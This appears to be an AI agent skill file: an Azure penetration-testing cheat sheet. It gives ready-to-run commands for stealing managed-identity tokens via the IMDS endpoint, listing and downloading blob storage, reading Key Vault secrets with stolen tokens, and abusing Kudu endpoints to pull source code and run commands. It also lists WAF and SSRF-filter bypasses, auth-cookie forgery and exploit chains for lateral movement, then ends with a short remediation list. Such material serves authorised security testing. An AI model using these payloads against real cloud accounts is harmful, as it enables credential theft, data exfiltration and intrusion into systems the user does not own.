---
name: azure
description: Azure cloud security assessment and exploitation techniques
---

# Azure Security

## Attack Surface

- IMDS endpoint at 169.254.169.254 accessible without authentication headers
- Managed Identity tokens obtainable via SSRF for lateral movement
- Blob storage containers with anonymous read access enabled
- Key Vault with overpermissive access policies or RBAC assignments
- Azure AD application registrations with excessive API permissions
- Function Apps with system-assigned managed identities and broad roles
- Exposed App Service SCM/Kudu endpoints (*.scm.azurewebsites.net)

## Detection Techniques

- Test IMDS: `curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"`
- Enumerate blob containers: `https://<account>.blob.core.windows.net/<container>?restype=container&comp=list`
- Probe managed identity: request token from IMDS identity endpoint
- Check for exposed Kudu: `https://<app>.scm.azurewebsites.net/`
- List Key Vault secrets with stolen token: `az keyvault secret list --vault-name <name>`
- Discover storage accounts via DNS: `<company>.blob.core.windows.net`

## Common Payloads

### IMDS Token Theft
```bash
# Instance metadata
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq .

# Managed identity access token (for Azure Resource Manager)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Token for Key Vault access
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Token for Microsoft Graph
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
```

### Blob Storage Enumeration
```bash
# Check anonymous container listing
curl "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"

# Download specific blob
curl "https://<account>.blob.core.windows.net/<container>/backup.sql"

# Authenticated access with stolen token
az storage blob list --account-name <account> --container-name <container> \
  --auth-mode login

# Search for sensitive files
az storage blob list --account-name <account> --container-name <container> \
  --query "[?contains(name, '.env') || contains(name, 'password')]"
```

### Key Vault Exploitation
```bash
# List secrets with managed identity token
az keyvault secret list --vault-name <vault> --query "[].{name:name}"

# Read secret values
az keyvault secret show --vault-name <vault> --name <secret-name>

# List keys and certificates
az keyvault key list --vault-name <vault>
az keyvault certificate list --vault-name <vault>

# Using REST API with stolen token
curl -s -H "Authorization: Bearer <token>" \
  "https://<vault>.vault.azure.net/secrets?api-version=7.4"
```

### Kudu / SCM Endpoint Abuse
```bash
# Access deployment logs
curl "https://<app>.scm.azurewebsites.net/api/deployments"

# Download application source via zip
curl "https://<app>.scm.azurewebsites.net/api/zip/site/wwwroot/" -o app.zip

# Read environment variables (may contain connection strings)
curl "https://<app>.scm.azurewebsites.net/Env"

# Execute commands via Kudu API
curl -X POST "https://<app>.scm.azurewebsites.net/api/command" \
  -H "Content-Type: application/json" -d '{"command":"whoami","dir":"/home"}'
```

## Bypass Techniques

- IMDS requires `Metadata: true` header; some SSRF filters miss custom headers
- Use `169.254.169.254` with non-standard ports or path encoding to evade WAF rules
- Blob storage supports SAS tokens; leaked tokens bypass container-level access policies
- App Service auth tokens in `X-MS-TOKEN-*` headers may be forwarded to backends
- Exploit `WEBSITE_AUTH_ENCRYPTION_KEY` from env vars to forge auth cookies

## Exploit Chaining

- SSRF + IMDS: steal managed identity token from vulnerable App Service
- Managed identity token + Key Vault: read database credentials and API secrets
- Blob read + Terraform state: extract service principal credentials from state files
- Kudu access + source code: download app code, find hardcoded secrets, pivot further
- Graph API token + AD enumeration: list users, groups, and app registrations for lateral movement

## Remediation

- Restrict IMDS access with Network Security Groups where possible
- Use user-assigned managed identities with minimal RBAC roles
- Disable anonymous blob access at the storage account level
- Apply Key Vault access policies with least privilege; prefer RBAC over vault policies
- Restrict SCM site access via IP restrictions or disable if not needed
- Enable Defender for Cloud for continuous posture assessment
- Rotate service principal credentials; prefer managed identities over secrets
